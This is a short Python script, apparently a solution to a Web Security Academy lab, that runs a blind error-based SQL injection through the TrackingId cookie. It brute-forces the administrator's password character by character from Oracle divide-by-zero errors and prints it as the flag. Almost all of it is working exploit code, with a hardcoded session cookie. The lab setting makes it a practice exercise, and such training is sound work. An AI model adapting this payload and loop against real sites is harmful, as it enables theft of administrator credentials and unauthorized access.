from bs4 import BeautifulSoup
import string
import requests

URL = "https://0aba00ae0422349681c798b3007e00df.web-security-academy.net"
TRACKING_ID = "HDrm8nLf7jJ2NLFZ"
SESSION = "7uUHoxNUXkwFmDX4AFe1oCmSTdc9rgYI"

PAYLOAD01 = "'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' and substr(password, "
PAYLOAD02 = ", 1)='"
PAYLOAD03 = "')||'"
CONDITION = "<h4>Internal Server Error</h4>"

PRINTABLE_STR = string.digits + string.ascii_lowercase
FLAG = ""

for i in range(1000):
    for j in range(len(PRINTABLE_STR)):
        PAYLOAD = PAYLOAD01 + str(i + 1) + PAYLOAD02 + PRINTABLE_STR[j] + PAYLOAD03

        print(PAYLOAD)

        COOKIE = {"TrackingId" : TRACKING_ID + PAYLOAD, "session" : SESSION}
    
        resp = requests.get(URL, cookies=COOKIE)

        if resp.text.find(CONDITION) > -1:
            print("Password["+str(i)+"] 'administrator' is " + PRINTABLE_STR[j])
            FLAG += PRINTABLE_STR[j]
            IS_FLAG = True
            break
    
    if j + 1 == len(PRINTABLE_STR):
        break

print('FLAG is ' + FLAG)